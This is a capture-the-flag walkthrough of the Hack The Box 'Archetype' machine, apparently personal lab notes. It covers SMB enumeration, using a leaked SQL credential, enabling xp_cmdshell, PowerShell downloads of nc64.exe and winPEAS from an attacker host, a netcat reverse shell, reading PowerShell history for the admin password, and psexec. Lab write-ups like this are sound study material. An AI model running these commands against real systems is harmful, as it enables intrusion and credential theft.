# Archetype

## Initial Enumeration

Did `nmap` as usual to get the open ports — could see so many open ports like MS RPC, MSSQL, and SMB client, etc.

```bash
nmap -sC -sV -p- -Pn {target_ip}
```

## SMB Enumeration

Now will try accessing the `smbclient`:

```bash
smbclient -N -L {target_ip}
```

- `-N` means no password  
- `-L` to list the shares

We can see that only `backup` and `IPC$` shares seem to be allowed public access, and we get a `.dtsconfig` file while opening the `backup` share.

## Understanding the `.dtsconfig` File

It seems `.dtsconfig` files are used to hardcode connection strings and passwords for the SQL Server so a **SSIS package** (SQL Server Integration Services) will use it to run ETLs.

Since this was stored insecurely, we can use the password and username given in the `.dtsconfig` and connect through Impacket to the SQL server.

```
password=[REDACTED];User ID=ARCHETYPE\sql_svc
```

## SQL Server Exploitation

We can connect using:

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{target_ip} -windows-auth
```

- `mssqlclient.py` is from the Impacket repo
- `-windows-auth` specifies to use Windows authentication

Now a SQL command line will show up. Use the following to check if our role is "sysadmin":

```sql
SELECT is_srvrolemember('sysadmin');
```

It returned `1` — so we have sysadmin access 🙌

Now we can use something called `xp_cmdshell` to run commands on the OS.

### Enable `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

To verify:

```sql
EXEC xp_cmdshell 'net user';
```

## Reverse Shell

We’ll use this to download `nc64.exe` from our local machine:

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
```

Host `nc64.exe` on a Python HTTP server on attacker machine:

```bash
python3 -m http.server
```

Now connect to our listener:

```bash
nc -lvp {port}
```

## Privilege Escalation

To escalate, we’ll use **winPEAS**, download and execute it on the victim:

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.190/winPEASx64.exe -outfile winPEASx64.exe"
```

Run it in PowerShell. It gives a massive output — looks like it's an enumeration tool to identify privilege escalation paths.

### Check PowerShell History

As per walkthrough, since this is both a normal user account and a service account, check for frequently accessed files or executed commands.

We read the PowerShell history:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

There we get the **admin password** 👀

## Getting Root

Now use:

```bash
python3 psexec.py administrator@10.129.95.187
```

We get the root flag 🎉

---

## Tools Used

- `winPEAS` — for local enumeration for privilege escalation.
- `psexec.py` — lets you authenticate with high privileges and get shell access (SMB-based).
